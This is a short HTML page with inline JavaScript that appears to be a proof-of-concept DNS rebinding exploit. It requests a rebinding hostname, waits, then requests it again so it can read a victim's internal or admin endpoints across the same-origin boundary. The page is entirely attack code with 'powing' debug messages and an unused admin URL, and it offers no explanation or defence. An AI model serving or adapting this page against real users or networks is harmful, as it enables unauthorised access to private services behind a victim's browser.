<!DOCTYPE html>
<html>
<body>

<p>DNS Rebinding</p>

<script>

function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}
    
function httpGet(theUrl)
{
    document.write("[In function httpGet\n]");
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
    
function TargetURL() {
  document.write("[In function TargetURL\n]");
  var URL = window.location.hostname;
  var URL2 = "plopper.cloud.dns"
  URL = "https://" + URL + "/dns_rebinding/admin";
  URL2 = "http://" + URL2;
  document.write("[In function TargetURL: TargetURL is:]");
  document.write(URL2);
  return URL2;
}

document.write("Starting powing");
var URL1 = httpGet(TargetURL());
document.write(URL1);
    
document.write("Ending pownding");
sleep(2000);
document.write("Slept");

document.write("Starting re-powing");
var URL3 = httpGet(TargetURL());
document.write(URL3);
    
document.write("Ending re-pownding");
</script>

</body>
</html>
